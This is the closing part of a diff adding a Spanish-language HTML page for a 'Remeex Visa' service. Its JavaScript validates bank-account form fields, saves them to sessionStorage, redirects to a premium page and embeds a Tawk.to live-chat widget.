+      acceptBtn.disabled = true;
+      countdownMsg.textContent = `Disponible en ${secondsLeft}s`;
+
+      countdownInterval = setInterval(() => {
+        secondsLeft--;
+        countdownMsg.textContent = `Disponible en ${secondsLeft}s`;
+        if (secondsLeft <= 0) {
+          clearInterval(countdownInterval);
+          acceptBtn.disabled = false;
+          countdownMsg.textContent = "¡Listo para continuar!";
+        }
+      }, 1000);
+    }
+
+    // Función para cerrar el modal
+    function closeModal() {
+      modalOverlay.classList.remove("active");
+      clearInterval(countdownInterval);
+    }
+
+    // Función para validar
+    function validateStep1() {
+      if (!selectedOptions.bank) {
+        alert("Por favor, selecciona un banco.");
+        return false;
+      }
+      if (!selectedOptions.accountNumber) {
+        alert("Por favor, completa los 16 dígitos restantes del número de cuenta.");
+        return false;
+      }
+      if (!selectedOptions.accountType) {
+        alert("Por favor, selecciona el tipo de cuenta.");
+        return false;
+      }
+      return true;
+    }
+
+    // Función para validar el resumen
+    function validateSummary() {
+      return true;
+    }
+
+    // Función para guardar automáticamente los datos bancarios
+    function guardarDatosAutomaticamente() {
+      const bank = bankSelect.value;
+      const bankCode = bankCodeInput.value;
+      const restAccountDigits = restAccountDigitsInput.value;
+      const accountType = accountTypeSelect.value;
+
+      sessionStorage.setItem("bancoUsuario", bank);
+      sessionStorage.setItem("codigoBancoUsuario", bankCode);
+      sessionStorage.setItem("digitosCuentaUsuario", restAccountDigits);
+      sessionStorage.setItem("tipoCuentaUsuario", accountType);
+    }
+
+    document.addEventListener("DOMContentLoaded", function() {
+      const bancoGuardado = sessionStorage.getItem("bancoUsuario") || "";
+      const codigoBancoGuardado = sessionStorage.getItem("codigoBancoUsuario") || "";
+      const digitosCuentaGuardados = sessionStorage.getItem("digitosCuentaUsuario") || "";
+      const tipoCuentaGuardado = sessionStorage.getItem("tipoCuentaUsuario") || "";
+
+      bankSelect.value = bancoGuardado;
+      if (bancoGuardado) {
+        const code = bankMapping[bancoGuardado];
+        bankCodeInput.value = code || "0000";
+        accountContainer.style.display = "flex";
+      } else {
+        bankCodeInput.value = "";
+        accountContainer.style.display = "none";
+      }
+      restAccountDigitsInput.value = digitosCuentaGuardados;
+      accountTypeSelect.value = tipoCuentaGuardado;
+
+      selectedOptions.bank = !!bancoGuardado;
+      selectedOptions.accountNumber = digitosCuentaGuardados.length === 16;
+      selectedOptions.accountType = !!tipoCuentaGuardado;
+      updateProgressBar();
+
+      bankSelect.addEventListener("change", guardarDatosAutomaticamente);
+      restAccountDigitsInput.addEventListener("input", guardarDatosAutomaticamente);
+      accountTypeSelect.addEventListener("change", guardarDatosAutomaticamente);
+    });
+
+    // *** Guardar en "datosRemeexVisa" y redirigir ***
+    function continueRemeexVisa() {
+      const bank = bankSelect.value;
+      const bankCode = bankCodeInput.value;
+      const restAccountDigits = restAccountDigitsInput.value.trim();
+      const accountType = accountTypeSelect.value;
+
+      // Armar el objeto con la cuenta completa
+      const formData = {
+        bank,
+        bankCode,
+        // Se guarda la cuenta completa
+        accountNumberCompleto: bankCode + restAccountDigits,
+        accountType
+      };
+
+      // Guardar en "datosRemeexVisa"
+      sessionStorage.setItem("datosRemeexVisa", JSON.stringify(formData));
+
+      // (Opcional) Si no necesitas borrar los datos parciales, ya no es necesario:
+      // sessionStorage.removeItem("bancoUsuario");
+      // sessionStorage.removeItem("codigoBancoUsuario");
+      // sessionStorage.removeItem("digitosCuentaUsuario");
+      // sessionStorage.removeItem("tipoCuentaUsuario");
+
+      // Redirigir a remeexvisapremium.html
+      isRedirecting = true;
+      window.location.href = "remeexvisapremium.html";
+    }
+  </script>
+
+  <!-- Integración de Tawk.to para soporte en vivo -->
+  <script>
+    var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+    (function(){
+      var s1=document.createElement("script"), s0=document.getElementsByTagName("script")[0];
+      s1.async=true;
+      s1.src='https://embed.tawk.to/676eba4c49e2fd8dfeff071f/1ig48fetj';
+      s1.charset='UTF-8';
+      s1.setAttribute('crossorigin','*');
+      s0.parentNode.insertBefore(s1,s0);
+    })();
+  </script>
+
+  <!-- SCRIPT PARA LEER DATOS EN remeexvisapremium.html (opcional) -->
+  <script>
+    // Al cargar remeexvisapremium.html, se puede leer:
+    // let datos = JSON.parse(sessionStorage.getItem("datosRemeexVisa"));
+    // console.log("Datos en remeexvisapremium.html:", datos);
+  </script>
+
+</body>
+</html>
